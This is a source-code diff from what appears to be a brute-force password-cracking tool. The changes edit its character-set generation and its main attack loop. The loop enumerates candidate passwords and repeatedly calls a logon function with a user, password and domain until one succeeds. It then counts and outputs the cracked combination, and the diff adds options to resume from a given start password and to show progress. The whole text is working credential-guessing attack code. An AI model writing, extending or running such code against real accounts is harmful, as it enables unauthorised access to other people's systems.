@@ -18,14 +18,11 @@ inline char* populateChars(BruteOptions *type) {
         }
     }
 
+
     if (type->digit) {
         for (i = '0'; i <= '9'; i++) {
             chars[j++] = i;
         }
-    }
-
-    if (type->space) {
-        chars[j++] = ' ';
     }
 
     if (type->punct) {
@@ -34,6 +31,10 @@ inline char* populateChars(BruteOptions *type) {
                 chars[j++] = i;
             }
         }
+    }
+
+    if (type->space) {
+        chars[j++] = ' ';
     }
 
     chars[j] = 0; // End with \0
@@ -85,12 +86,45 @@ void brute_attack() {
         success = false;
         carry = false;
 
+
+        // Start pass
+        if (opts->brute_opts->has_start_pass) {
+            opts->brute_opts->has_start_pass = false;
+            strcpy(pass, opts->brute_opts->start_pass);
+        }
+
         // PASS LOOP
         while (true) {
 
             // Check enter
             if (enter_down()) {
-                return;
+                if (opts->enter_info) {
+                    outln(string(user) + " > " + string(pass));
+                } else {
+                    outln("\nStopped.");
+                    return;
+                }
+
+            }
+
+            if (!opts->filter_pass || filter_pass(pass)) { // password okay!
+                // New try
+                if (opts->limit_tries && tries >= opts->max_tries) {
+                    break;
+                }
+                tries++;
+
+
+                // Try logon
+                if (fast_logon(user, pass, domain)) {
+                    cracks++;
+                    success = true;
+                    break;
+                }
+
+                if (opts->verbose) {
+                    outln(string(user) + " > " + string(pass));
+                }
             }
 
             // Update password
@@ -117,34 +151,13 @@ void brute_attack() {
                     break;
                 }
             }
-
-            if (opts->filter_pass && !filter_pass(pass)) {
-                continue;
-            }
-
-            // New try
-            if (opts->limit_tries && tries >= opts->max_tries) {
-                break;
-            }
-            tries++;
-
-            // Try logon
-            if (fast_logon(user, pass, domain)) {
-                cracks++;
-                success = true;
-                break;
-            }
-
-            if (opts->verbose) {
-                outln(string(user) + " > " + string(pass));
-            }
         }
 
         // Out combo
         out_combo(user, pass, success);
 
         // Skip check
-        if (success && opts->stop) {
+        if (success && opts->single) {
             break;
         }
     }
